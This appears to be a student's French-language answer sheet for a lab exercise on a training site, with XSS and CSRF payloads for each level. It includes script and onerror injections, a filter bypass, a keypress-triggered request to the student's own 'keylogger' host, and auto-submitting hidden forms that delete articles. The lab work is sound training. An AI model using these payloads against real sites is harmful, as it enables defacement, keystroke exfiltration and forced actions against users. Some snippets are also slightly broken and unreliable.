# Mes réponses - XSS & CSRF

## Partie 1 - XSS
### Level 1
1. `https://xss-csrf-tp.herokuapp.com/level/1?page=1%3Cimg%20src=%22https://cdn.pixabay.com/photo/2016/08/16/10/18/dragon-1597583_960_720.png%22/%3E`

### Level 2
1. `<script>alert('Toto')</script>`
2. La balise ne fonctionne pas, car les script sont bloqués par sécurité.
3. Les données sont récupérées en POST.
4. `<img src='toto.jpg' onerror="body.remove()" ></img>`
5.

### Level 3
1. `<i<img>mg src='toto.jpg' onerror="body.remove()"/>`
2. (Ou avec fetch, mais j'avais pas envie :) )
```javascript
    (function() {
      var httpRequest;
      window.addEventListener('keypress', makeRequest);

      function makeRequest() {
        httpRequest = new XMLHttpRequest();

        if (!httpRequest) {
          console.log('Abandon :( Impossible de créer une instance de XMLHTTP');
          return false;
        }
        httpRequest.onreadystatechange = alertContents;
        httpRequest.open('GET', 'https://my-malicious-website-brugiere.herokuapp.com/keylogger.php');
        httpRequest.setRequestHeader('Access-Control-Allow-Origin', null);
        httpRequest.send();
      }

      function alertContents() {
        if (httpRequest.readyState === XMLHttpRequest.DONE) {
          if (httpRequest.status === 200) {
            console.log(httpRequest.responseText);
          } else {
            console.log('Il y a eu un problème avec la requête.');
          }
        }
      }
    })();
```

## Partie 2 - CSRF
1. [Site Heroku](https://my-malicious-website-brugiere.herokuapp.com/)

2.
```php
    <?php include_once("index.html"); ?>

    <form
    	action="https://xss-csrf-tp.herokuapp.com/articles/delete"
    	method="GET"
        id="42"
    >
    </form>

    <script>
    	document.getElementById("42").submit();
    </script>
```

3.
```php
    <?php include_once("index.html"); ?>

    <iframe name="hiddenIFrame" style="display: none;"></iframe>

    <form
    	action="https://xss-csrf-tp.herokuapp.com/articles/delete"
        method="about:blank"
        id="42"
        target="hiddenIFrame"
    >
    </form>

    <script>
    	document.getElementById("42").submit();
    </script>
```
